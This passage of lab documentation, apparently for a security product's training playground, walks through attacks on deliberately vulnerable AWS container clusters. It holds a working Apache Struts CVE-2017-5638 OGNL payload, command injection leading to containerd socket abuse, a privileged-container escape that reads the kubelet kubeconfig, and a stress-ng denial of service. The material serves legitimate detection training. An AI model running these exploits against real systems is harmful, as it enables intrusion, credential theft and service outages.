<pre><code>pgo -o ecs\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>cluster_name_ec2 = \"playground-ecs-ec2\"\nloadbalancer_dns_ec2 = \"playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\"\n</code></pre>"},{"location":"scenarios/server-workload-ecs-ec2-malware-upload/#exploit","title":"Exploit","text":"<p>To access the <code>todolist</code> application append <code>/todolist</code> to the loadbalancer DNS name in your browser.</p> <p>Navigate to http://playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com/todolist</p> <p>Click <code>[Sign in]</code></p> <ul> <li>Username: <code>foo@bar.org</code></li> <li>Password: <code>foobar</code></li> </ul> <p>Then navigate to <code>Upload files</code> and upload some malware.</p> <p>View events in Server &amp; Workload Protection</p>"},{"location":"scenarios/as/tmas-artifact-scanning/","title":"Scenario: Vulnerability and Malware Scanning","text":"<p>DRAFT</p>"},{"location":"scenarios/as/tmas-artifact-scanning/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One Container Security Artifact Scanner API-Key</li> </ul> <p>Ensure to have the latest <code>tmas</code> deployed:</p> <pre><code>tmas-update\n</code></pre>"},{"location":"scenarios/as/tmas-artifact-scanning/#scan-images","title":"Scan Images","text":"<p>First, set the Artifact Scanner API-Key as an environment variable:</p> <pre><code>export TMAS_API_KEY=&lt;YOUR API-Key&gt;\n</code></pre> <p>Note: tmas defaults to the Vision One service region <code>us-east-1</code>. If your Vision One is serviced from any other region you need to add the <code>--region</code> flag to the scan request.</p> <p>Valid regions: <code>[ap-southeast-2 eu-central-1 ap-south-1 ap-northeast-1 ap-southeast-1 us-east-1]</code></p> <p>To easily scan an image for vulnerabililies run</p> <pre><code># Service region us-east-1\ntmas scan docker:nginx:latest\n\n# Service region eu-central-1\ntmas scan docker:nginx:latest --region eu-central-1\n</code></pre> <p>Scanning an image for vulnerabilities and malware simultaneously is as easy as above</p> <pre><code>tmas scan docker:mawinkler/evil2:latest --malwareScan\n</code></pre> <p>At the time of writing, the second scan should find 24 vulnerabilities and one malware:</p> <pre><code>{\n\"vulnerability\": {\n\"totalVulnCount\": 24,\n\"criticalCount\": 0,\n\"highCount\": 0,\n\"mediumCount\": 6,\n\"lowCount\": 15,\n\"negligibleCount\": 3,\n\"unknownCount\": 0,\n\"findings\": {\n...\n\"malware\": {\n\"scanResult\": 1,\n\"findings\": [\n{\n\"layerDigest\": \"sha256:d5fafe98396dfece28a75fc06ef876bf2e9014d62d908f8296a925bab92ab4b9\",\n\"layerDiffID\": \"sha256:d5fafe98396dfece28a75fc06ef876bf2e9014d62d908f8296a925bab92ab4b9\",\n\"fileName\": \"eicarcom2.zip\",\n\"fileSize\": 308,\n\"fileSHA256\": \"sha256:e1105070ba828007508566e28a2b8d4c65d192e9eaf3b7868382b7cae747b397\",\n\"foundMalwares\": [\n{\n\"fileName\": \"eicarcom2.zip\",\n\"malwareName\": \"OSX_EICAR.PFH\"\n}\n]\n}\n],\n\"scanID\": \"300d7aed-2f1f-4818-af62-24f9378fe91d\",\n\"scannerVersion\": \"1.0.0-471\"\n}\n}\n</code></pre> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/ds/ds-integrate/","title":"Scenario: Integrate Deep Security with Vision One","text":"<p>DRAFT</p>"},{"location":"scenarios/ds/ds-integrate/#prerequisites","title":"Prerequisites","text":"<p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/ds/ds-migrate/","title":"Scenario: Migrate Deep Security to Vision One","text":"<p>DRAFT</p>"},{"location":"scenarios/ds/ds-migrate/#prerequisites","title":"Prerequisites","text":"<p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/ds/ws-integrate/","title":"Scenario: Integrate Workload Security with Vision One","text":"<p>DRAFT</p>"},{"location":"scenarios/ds/ws-integrate/#prerequisites","title":"Prerequisites","text":"<p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/ds/ws-migrate/","title":"Scenario: Migrate Workload Security to Vision One","text":"<p>DRAFT</p>"},{"location":"scenarios/ds/ws-migrate/#prerequisites","title":"Prerequisites","text":"<p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/ecs/apache-struts-rce/","title":"Scenario: Detect Apache Struts RCE Vulnerability Exploitation","text":""},{"location":"scenarios/ecs/apache-struts-rce/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One connected to your AWS Account</li> <li>Playground One ECS Cluster (Any variant)</li> <li>Running app: Java-Goof running on vulnerable Tomcat</li> <li>Extracted contents of <code>exploit.zip</code></li> </ul> <p>Ensure to have an ECS Cluster up and running:</p> <pre><code>pgo --apply ecs\n</code></pre> <p>Ensure to have Runtime Security enabled on the Vision One Console for this cluster.</p> <p>If you need to extract the exploits unzip with the password <code>virus</code>:</p> <pre><code>cd ${ONEPATH}\nunzip exploits.zip\n</code></pre>"},{"location":"scenarios/ecs/apache-struts-rce/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/ecs/apache-struts-rce/#exploiting","title":"Exploiting","text":"<p>First, retrieve the load balancer DNS name</p> <pre><code>pgo -o ecs\n</code></pre> <p>Example output with ECS EC2:</p> <pre><code>cluster_name_ec2 = \"pgo-cnc-ecs-ec2\"\necs_ami_ec2 = \"ami-00a947e5cc1e6d3d3\"\nloadbalancer_dns_ec2 = \"pgo-cnc-ecs-ec2-30050812.eu-central-1.elb.amazonaws.com\"\n</code></pre> <p>If you are using ECS Fargate, the variable is named <code>loadbalancer_dns_fargate</code>.</p>"},{"location":"scenarios/ecs/apache-struts-rce/#exploit","title":"Exploit","text":"<p>Run:</p> <pre><code>cd ${ONEPATH}/exploits/struts/\n./struts-exploit.sh pgo-cnc-ecs-ec2-30050812.eu-central-1.elb.amazonaws.com\n</code></pre> <p>Expexted result:</p> <pre><code>*   Trying 18.195.245.32:80...\n* Connected to playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com (18.195.245.32) port 80 (#0)\n&gt; GET /todolist/todolist/ HTTP/1.1\n&gt; Host: playground-ecs-ec2-135067951.eu-central-1.elb.amazonaws.com\n&gt; User-Agent: curl/7.81.0\n&gt; Accept: */*\n&gt; Content-type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 200 \n&lt; Date: Tue, 01 Aug 2023 12:45:58 GMT\n&lt; Transfer-Encoding: chunked\n&lt; Connection: keep-alive\n&lt; \nLD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib\nECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/46de0786-9920-42aa-bff4-c17fd4d273c5\nCATALINA_HOME=/usr/local/tomcat\nLANG=C.UTF-8\nHOSTNAME=ip-10-0-175-104.eu-central-1.compute.internal\n...\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\nmessagebus:x:101:101::/var/run/dbus:/bin/false\n* transfer closed with outstanding read data remaining\n* Closing connection 0\ncurl: (18) transfer closed with outstanding read data remaining\n</code></pre> <p>Vision One Observed Attack Techniques:</p> <p></p> <p>Container Security Runtime Event:</p> <p></p>"},{"location":"scenarios/ecs/runtime-vulnerability/","title":"Scenario: Runtime Vulnerability Scanning","text":""},{"location":"scenarios/ecs/runtime-vulnerability/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One connected to your AWS Account</li> <li>Playground One ECS Cluster</li> </ul> <p>Ensure to have the ECS Cluster up and running:</p> <pre><code>pgo --apply ecs\n</code></pre> <p>Ensure to have Runtime Scanning enabled on the Vision One Console for this cluster.</p>"},{"location":"scenarios/ecs/runtime-vulnerability/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the ECS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/ecs/runtime-vulnerability/#overview","title":"Overview","text":"<p>This scenario showcases the vulnerability detection functionalities of Vision One Container Security at runtime in ECS clusters. The deployment of this scenario is based on a container image with plenty of different vulnerabilities.</p> <p>By the end of the scenario, you will understand and learn the following:</p> <ul> <li>Reviewing vulnerability findings and searching for a specific vulnerability</li> <li>Proof the finding by exploitation</li> </ul>"},{"location":"scenarios/ecs/runtime-vulnerability/#the-story","title":"The story","text":"<p>Every now and then new critical vulnerabilities are disclosed. A famous one with huge impact was the  vulnerability CVE-2017-5638. </p> <p>On March 6th 2017, a new remote code execution (RCE) vulnerability in Apache Struts 2 was made public. This vulnerability allows a remote attacker to inject operating system commands into a web application through the \u201cContent-Type\u201d header. Written in Java, Apache Struts 2 is the popular open source web application framework. This is yet another incident that adds up to a long list of vulnerabilities in this framework.</p> <p>You want to search and validate for this specific vulnerability in your production environment.</p>"},{"location":"scenarios/ecs/runtime-vulnerability/#goals","title":"Goals","text":"<p>The goal of this scenario is to identify the vulnerable deployment and proof that it is vulnerable.</p>"},{"location":"scenarios/ecs/runtime-vulnerability/#hints","title":"Hints","text":"<p>\u2728 Didn't find the vulnerable deployment?</p> <p>Head over to Container Security --&gt; Runtime vulnerability and search for CVE-2017-5638. \ud83d\ude4c</p>"},{"location":"scenarios/ecs/runtime-vulnerability/#solution-walkthrough","title":"Solution &amp; Walkthrough","text":"<p>Head over to Container Security --&gt; Container Protection --&gt; Vulnerabilities --&gt; ECS and search for the vulnerability <code>CVE-2017-5638</code>.</p> <p>Identify the vulnerable deployment/container on the ECS cluster(s)</p> <p></p> <p>Next step is to find out the load balancer address of the vulnerable service. The finding tells us (amongst others) the following:</p> <ul> <li>AWS Account ID: <code>634503960501</code></li> <li>AWS Region of the cluster: <code>eu-central-1</code></li> <li>Cluster name: <code>pgo-cnc-ecs-ec2</code></li> </ul> <p>With this, head over to your AWS console and access the ECS service in the region from above.</p> <p></p> <p>Click on the service name <code>pgo-cnc-ecs-ec2</code> since this provides the vulnerable container <code>goof</code>.</p> <p></p> <p>On the right, click on <code>[View Load Balancer]</code></p> <p></p> <p>This gives you the DNS name.</p> <pre><code>pgo-cnc-ecs-ec2-30050812.eu-central-1.elb.amazonaws.com\n</code></pre> <p>Now, verify the vulnerability by running:</p> <pre><code>cd ${ONEPATH}/exploits/struts/\n./struts-exploit.sh pgo-cnc-ecs-ec2-30050812.eu-central-1.elb.amazonaws.com\n</code></pre> <pre><code>[*] CVE: 2017-5638 - Apache Struts2 S2-045\n[*] cmd: cat /etc/passwd\n\nb'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\\n'\n</code></pre> <p>You proofed that the application server of your little goof application is vulnerable to CVE-2017-5638.</p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/eks/dind-exploitation/","title":"Scenario: ContainerD Abuse","text":""},{"location":"scenarios/eks/dind-exploitation/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS EC2 Cluster</li> <li>Vision One Container Security</li> <li>Playground One Scenarios</li> <li>Running app: System Monitor</li> </ul> <p>Ensure to have the EKS EC2 Cluster including the Scenarios up and running:</p> <pre><code>pgo --apply eks-ec2\npgo --apply scenarios-ec2\n</code></pre>"},{"location":"scenarios/eks/dind-exploitation/#attribution","title":"Attribution","text":"<p>This scenario is based on Kubernetes Goat but heavily adapted to work an Playground One and EKS.</p>"},{"location":"scenarios/eks/dind-exploitation/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/eks/dind-exploitation/#overview","title":"Overview","text":"<p>In this scenario, we will be focusing on the common and standard ways how to build systems and pipelines that leverage container sockets to create, build and run containers from the underlying container runtime. This has been exploited since the early days of the container ecosystem and even today we see these misconfigurations/use cases in the real world. </p> <p>By the end of the scenario, you will understand and learn the following:</p> <ul> <li>You will learn to test and exploit the container UNIX socket misconfigurations</li> <li>Able to exploit container and escape out of the container</li> <li>Learn about ContainerD</li> <li>Learn common misconfigurations in pipelines and CI/CD build systems</li> </ul>"},{"location":"scenarios/eks/dind-exploitation/#the-story","title":"The story","text":"<p>Most of the CI/CD and pipeline systems use the underlying host Docker runtime to build containers for you within the pipeline by using something called DIND (docker-in-docker) with a UNIX socket. Here in this scenario, we try to exploit a very similar misconfiguration and gain access to the host system by escaping out of the container.</p> <p>Note: To get started with the scenario, navigate to <code>http://&lt;loadbalancer_dns_health_check&gt;</code></p>"},{"location":"scenarios/eks/dind-exploitation/#goals","title":"Goals","text":"<p>The goal of this scenario is to escape out of the running container to the host system where the container is running and able to access and perform actions on the host system.</p> <p>Tip: If you are able to obtain containers running in the host system then you have completed this scenario. But definitely, you can advance beyond this exploitation as well by performing post-exploitation, e.g. spinning up an additional container.</p>"},{"location":"scenarios/eks/dind-exploitation/#hints","title":"Hints","text":"Click here  \u2728 Do you know how to run multiple commands in Linux?  The application running here has command injection vulnerability. You can exploit this by using the ; delimiter when passing the input \ud83d\ude4c  \u2728 Able to run system commands, not sure how to access containers?  Identify the mounted UNIX socket volume, and use `ctr` binary to communicate with that with -H flag \ud83c\udf89"},{"location":"scenarios/eks/dind-exploitation/#solution-walkthrough","title":"Solution &amp; Walkthrough","text":"Click here  Start by checking that DNS resolution is working for your cluster. If this doesn't work, check to see if you have a DNS service like CoreDNS running on your cluster.  <pre><code>www.google.com\n</code></pre>  By looking at the application functionality and dabbling with the input and output, we can see it has standard command injection vulnerability. Assuming it's running in a Linux container we can use the `;` delimiter to run/pass other commands  <pre><code>127.0.0.1; id\n</code></pre>  As we can see it returns the response for the `id` command, now we can analyze the system and see what potential information we can obtain.  It contains `/containerd.sock` mounted into the file system as it's not available commonly in standard systems  <pre><code>; mount\n</code></pre>  Wow! We can see the `/custom/containerd/containerd.sock` mounted in the file system and assuming it's mounted from the host system we need to talk to it for communicating with the UNIX socket via gRPC.  Note: We can use multiple methods for communicating with the `containerd.sock` UNIX socket. Some of them include [official containerd binary](https://containerd.io/downloads/), or a simple `grpcurl` program as well.  The easiest way to interact with containerd is to use the `ctr` command. We can download the official `ctr` static binary from the internet [https://containerd.io/downloads/](https://containerd.io/downloads/).  Then download the appropriate containerd binary to the container. We can use the following command (takes some time, be patient).  <pre><code>; wget https://github.com/containerd/containerd/releases/download/v1.6.20/containerd-1.6.20-linux-amd64.tar.gz -O /tmp/containerd-1.6.20.tgz\n</code></pre>  We can extract the binary from the `containerd-1.6.20.tgz` file so that we can use that to talk to the UNIX socket  <pre><code>; tar -xvzf /tmp/containerd-1.6.20.tgz -C /tmp/ bin/ctr\n</code></pre>  Now we can access the host system by running the following containerd commands with passing `containerd.sock` containerd's gRPC server. Let's check what is running from kubernetes.  <pre><code>; /tmp/bin/ctr -a /custom/containerd/containerd.sock -n=k8s.io containers ls\n</code></pre>  Hooray \ud83e\udd73, now we can see that it has a lot of containers are running in the host system. We can now use different ctr commands to gain more access and further exploitation.  \ud83c\udf89 Success \ud83c\udf89  If you'd like to create containers now, try it. Be beware of the fact that the design of containerd is that clients should be local to the daemon. Running a client in a container is effectively non-local without some very specific configuration (which will vary depending on what you are trying to do)."},{"location":"scenarios/eks/dind-exploitation/#references","title":"References","text":"<ul> <li>Interacting with containerd runtime for kubernetes</li> </ul>"},{"location":"scenarios/eks/escape/","title":"Scenario: Escape to the Host System","text":""},{"location":"scenarios/eks/escape/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS EC2 Cluster</li> <li>Vision One Container Security</li> <li>Playground One Scenarios</li> <li>Running app: System Monitor</li> </ul> <p>Ensure to have the EKS EC2 Cluster including the Scenarios up and running:</p> <pre><code>pgo --apply eks-ec2\npgo --apply scenarios-ec2\n</code></pre>"},{"location":"scenarios/eks/escape/#attribution","title":"Attribution","text":"<p>This scenario is based on Kubernetes Goat but adapted to work an Playground One and EKS.</p>"},{"location":"scenarios/eks/escape/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/eks/escape/#overview","title":"Overview","text":"<p>This scenario showcases the common misconfigurations and one of the error-prone security issues in Kubernetes, container environments, and the general security world. Giving privileges that are not required for things always makes security worse. This is especially true in the containers and Kubernetes world. You can also apply this scenario further and beyond the container to other systems and services based on the configuration and setup of the cluster environments and resources. In this scenario you will see a privileged container escape to gain access to the host system.</p> <p>By the end of the scenario, you will understand and learn the following:</p> <ul> <li>Able to exploit the container and escape out of the docker container</li> <li>You will learn to test and exploit the misconfigured and privileged containers</li> <li>Learn about common misconfigurations and possible damage due to them for the containers, Kubernetes, and clusterized environments</li> </ul>"},{"location":"scenarios/eks/escape/#the-story","title":"The story","text":"<p>Most of the monitoring, tracing, and debugging software requires extra privileges and capabilities to run. In this scenario, you will see a pod with extra capabilities and privileges including HostPath allowing you to gain access to the host system and provide Node level configuration to gain complete cluster compromise.</p> <p>Note: To get started with the scenario, navigate to <code>http://&lt;loadbalancer_dns_system_monitor&gt;</code></p>"},{"location":"scenarios/eks/escape/#goals","title":"Goals","text":"<p>The goal of this scenario is to escape out of the running docker container on the host system using the available misconfigurations. The secondary goal is to use the host system-level access to gain other resources access and if possible even go beyond this container, node, and cluster-level access.</p> <p>Tip: Gain access to the host system and obtain the node level kubeconfig file <code>/var/lib/kubelet/kubeconfig</code>, and query the Kubernetes nodes using the obtained configuration.</p>"},{"location":"scenarios/eks/escape/#hints","title":"Hints","text":"Click here  \u2728 Are you still in the container?  See the mounted file systems, also look the capabilities available for the container using capsh \ud83d\ude4c&lt;  \u2728 Escaped container?  You can recon the system, some interesting places to obtain the node level configuration are `/var/lib/kubelet/kubeconfig` and I hope you know how to query Kubernetes API for nodes? \ud83c\udf89"},{"location":"scenarios/eks/escape/#solution-walkthrough","title":"Solution &amp; Walkthrough","text":"Click here  After performing the analysis, you can identify that this container has full privileges of the host system and allows privilege escalation. As well as `/host-system` is mounted.  <pre><code>capsh --print\n</code></pre> <pre><code>mount\n</code></pre>  Now you can explore the mounted file system by navigating to the `/host-system` path  <pre><code>ls /host-system/\n</code></pre>  You can gain access to the host system privileges using `chroot`.  <pre><code>chroot /host-system bash\n</code></pre>  As you can see, now you can access all the host system resources like docker containers, configurations, etc.  Trying to use the docker client fails.  <pre><code>docker ps\n</code></pre> <pre><code>bash: docker: command not found\n</code></pre>  This does not work, since we're on a Kubernetes optimized node OS with no docker provided.  <pre><code>uname -a\n</code></pre> <pre><code>Linux system-monitor-6dfbdbb7d-w6mdv 5.10.184-175.749.amzn2.x86_64 #1 SMP Wed Jul 12 18:40:28 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\n</code></pre>  The Kubernetes node configuration can be found at the default path, which is used by the node level kubelet to talk to the Kubernetes API Server. If you can use this configuration, you gain the same privileges as the Kubernetes node.  <pre><code>cat /var/lib/kubelet/kubeconfig\n</code></pre> <pre><code>apiVersion: v1\nkind: Config\nclusters:\n- cluster:\n    certificate-authority: /etc/kubernetes/pki/ca.crt\n    server: https://BD215DBE2E4127977439D904B2AD3307.gr7.eu-central-1.eks.amazonaws.com\n  name: kubernetes\ncontexts:\n- context:\n    cluster: kubernetes\n    user: kubelet\n  name: kubelet\ncurrent-context: kubelet\nusers:\n- name: kubelet\n  user:\n    exec:\n      apiVersion: client.authentication.k8s.io/v1beta1\n      command: /usr/bin/aws-iam-authenticator\n      args:\n        - \"token\"\n        - \"-i\"\n        - \"playground-one-eks\"\n        - --region\n        - \"eu-central-1\"\n</code></pre>  Sadly, there is no `kubectl` as well.  <pre><code>kubectl\n</code></pre> <pre><code>bash: kubectl: command not found\n</code></pre>  Trying to use the package manager `yum` will not solve the problem. But navigating to https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux will help:  <pre><code>cd\ncurl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\nchmod +x kubectl\n</code></pre>  Try to get the available nodes of our cluster:  <pre><code>./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes </code></pre> <pre><code>NAME                                            STATUS   ROLES    AGE   VERSION\nip-10-0-152-251.eu-central-1.compute.internal   Ready    &lt;none&gt;   56m   v1.25.11-eks-a5565ad\nip-10-0-169-117.eu-central-1.compute.internal   Ready    &lt;none&gt;   56m   v1.25.11-eks-a5565ad\n</code></pre>  Can you do more?  <pre><code>./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get pods -A\n</code></pre> <pre><code>NAMESPACE           NAME                                               READY   STATUS    RESTARTS   AGE\ngoat                system-monitor-6dfbdbb7d-w6mdv                     1/1     Running   0          53m\nkube-system         aws-load-balancer-controller-577dcc6f77-sqtfr      1/1     Running   0          92m\nkube-system         aws-node-8wl6v                                     1/1     Running   0          92m\nkube-system         aws-node-ksdjv                                     1/1     Running   0          92m\nkube-system         cluster-autoscaler-6696cf9bff-2s52q                1/1     Running   0          92m\nkube-system         coredns-6bcddfff7-hrwwl                            1/1     Running   0          92m\nkube-system         coredns-6bcddfff7-kp266                            1/1     Running   0          92m\nkube-system         ebs-csi-controller-7dffd5b9fd-2w7r8                6/6     Running   0          92m\nkube-system         ebs-csi-controller-7dffd5b9fd-fdhfc                6/6     Running   0          92m\nkube-system         ebs-csi-node-k77sx                                 3/3     Running   0          92m\nkube-system         ebs-csi-node-vj6c7                                 3/3     Running   0          92m\nkube-system         kube-proxy-62dls                                   1/1     Running   0          92m\nkube-system         kube-proxy-mshz7                                   1/1     Running   0          92m\ntrendmicro-system   trendmicro-admission-controller-74d8d7f866-dv87r   1/1     Running   0          53m\ntrendmicro-system   trendmicro-oversight-controller-557df87c9-6c4dx    2/2     Running   0          69m\ntrendmicro-system   trendmicro-scan-manager-6ddb6f69b8-r85dk           1/1     Running   0          53m\ntrendmicro-system   trendmicro-scout-gkl4k                             2/2     Running   0          69m\ntrendmicro-system   trendmicro-scout-tz68w                             2/2     Running   0          69m\ntrendmicro-system   trendmicro-usage-controller-6944c5b55b-m8hgh       2/2     Running   0          53m\ntrendmicro-system   trendmicro-workload-operator-6cf5c98c6f-xq8bb      1/1     Running   0          69m\ntrivy-system        trivy-operator-57c774d7c4-hmnlk                    1/1     Running   0          53m\nvictims             java-goof-5878dd4dd-9lnst                          1/1     Running   0          53m\nvictims             web-app-854bdf944f-ddqcs                           1/1     Running   0          53m\n</code></pre> <pre><code>./kubectl --kubeconfig /var/lib/kubelet/kubeconfig get nodes </code></pre> <pre><code>NAME                                            STATUS   ROLES    AGE   VERSION\nip-10-0-152-251.eu-central-1.compute.internal   Ready    &lt;none&gt;   76m   v1.25.11-eks-a5565ad\nip-10-0-169-117.eu-central-1.compute.internal   Ready    &lt;none&gt;   76m   v1.25.11-eks-a5565ad\n</code></pre>  \ud83c\udf89 Success \ud83c\udf89"},{"location":"scenarios/eks/hunger-check/","title":"Scenario: Hunger Check","text":""},{"location":"scenarios/eks/hunger-check/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS EC2 Cluster</li> <li>Playground One Scenarios</li> <li>Running app: Hunger Check</li> </ul> <p>Ensure to have the EKS EC2 Cluster including the Scenarios up and running:</p> <pre><code>pgo --apply eks-ec2\npgo --apply scenarios-ec2\n</code></pre> <p>We will use the Kubernetes Metrics Server which is an aggregator of resource usage data in our cluster. The Metrics Server isn't deployed by default in Amazon EKS clusters. To deploy it run</p> <pre><code>kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml\n</code></pre>"},{"location":"scenarios/eks/hunger-check/#attribution","title":"Attribution","text":"<p>This scenario is based on Kubernetes Goat but adapted to work an Playground One and EKS.</p>"},{"location":"scenarios/eks/hunger-check/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. Remember: we're using vulnerable apps.</p>"},{"location":"scenarios/eks/hunger-check/#overview","title":"Overview","text":"<p>Availability is one of the triads in CIA. One of the core problems solved by Kubernetes is the management of the resources like autoscaling, rollouts, etc. In this scenario, we will see how attackers can leverage and gain access to more resources or cause an impact on the availability of the resources by performing the DoS (Denial of Service) if there were no resource management configurations implemented on the cluster resources like memory and CPU requests and limits.</p> <p>By the end of the scenario, we will understand and learn the following</p> <ul> <li>Learn to perform the DoS on computing and memory resources using stress-ng</li> <li>Understand the Kubernetes resources management for pods and containers</li> <li>Explore the Kubernetes resource monitoring using the metrics and information</li> </ul>"},{"location":"scenarios/eks/hunger-check/#the-story","title":"The story","text":"<p>There is no specification of resources in the Kubernetes manifests and no applied limit ranges for the containers. As an attacker, we can consume all the resources where the pod/deployment running and starve other resources and cause a DoS for the environment.</p> <p>Note: To get started with the scenario, navigate to <code>http://&lt;loadbalancer_dns_hunger_check&gt;</code></p>"},{"location":"scenarios/eks/hunger-check/#goals","title":"Goals","text":"<p>Access more resources than intended for this pod/container by consuming 2GB of memory to successfully complete the scenario.</p> <p>Tip: If you are able to obtain containers running in the host system then you have completed this scenario. But definitely, you can advance beyond this exploitation as well by performing post-exploitation, e.g. spinning up an additional container.</p>"},{"location":"scenarios/eks/hunger-check/#hints","title":"Hints","text":"Click here  \u2728 How can I DoS resources?  You can leverage the popular command line utility like stress-ng \ud83d\ude4c"},{"location":"scenarios/eks/hunger-check/#solution-walkthrough","title":"Solution &amp; Walkthrough","text":"Click here  This deployment pod has not set any resource limits in the Kubernetes manifests. So we can easily perform a bunch of operations that can consume more resources.  We can use simple utilities like stress-ng to perform stress testing like accessing more resources. The below command is to access more resources than specified.  <pre><code>root@hunger-check-655dfcd8b9-bcfgq:/# stress-ng --vm 2 --vm-bytes 2G --timeout 30s\n</code></pre> <pre><code>stress-ng: info:  [41] dispatching hogs: 2 vm\nstress-ng: info:  [41] successful run completed in 30.09s\nroot@hunger-check-655dfcd8b9-bcfgq:/# </code></pre>  You can see the difference between the normal resources consumption vs while running stress-ng where it consumes a lot of resources than it intended to consume. Run the following command in your local/Cloud9 shell:  <pre><code>watch kubectl --namespace goat top pod $(kubectl -n goat get pods --selector=app=hunger-check -o jsonpath='{.items[0].metadata.name}')\n</code></pre>  ***DANGER***  This attack may not work in some cases like autoscaling, resource restrictions, etc. Also, it may cause more damage when autoscaling is enabled and more resources are created. This could lead to more expensive bills by the cloud provider or impacting the availability of the resources and services.  Hooray \ud83e\udd73, now we can see that it can consume more resources than intended which might affect the resource availability and also increase billing.  \ud83c\udf89 Success \ud83c\udf89"},{"location":"scenarios/eks/runtime-violations/","title":"Scenario: Vision One Container Security Generate Runtime Violations","text":""},{"location":"scenarios/eks/runtime-violations/#prerequisites","title":"Prerequisites","text":"<ul> <li>Playground One EKS EC2 Cluster</li> <li>Vision One Container Security</li> <li>Playground One Scenarios</li> </ul> <p>Ensure to have the EKS EC2 Cluster including the Scenarios up and running:</p> <pre><code>pgo --apply eks-ec2\npgo --apply scenarios-ec2\n</code></pre>"},{"location":"scenarios/eks/runtime-violations/#disclaimer","title":"Disclaimer","text":"<p>Note: It is highly recommended to have the <code>awsone.access_ip</code> set to a single IP or at least a small CIDR before deploying the EKS cluster. This will prevent anonymous users playing with your environmnent. 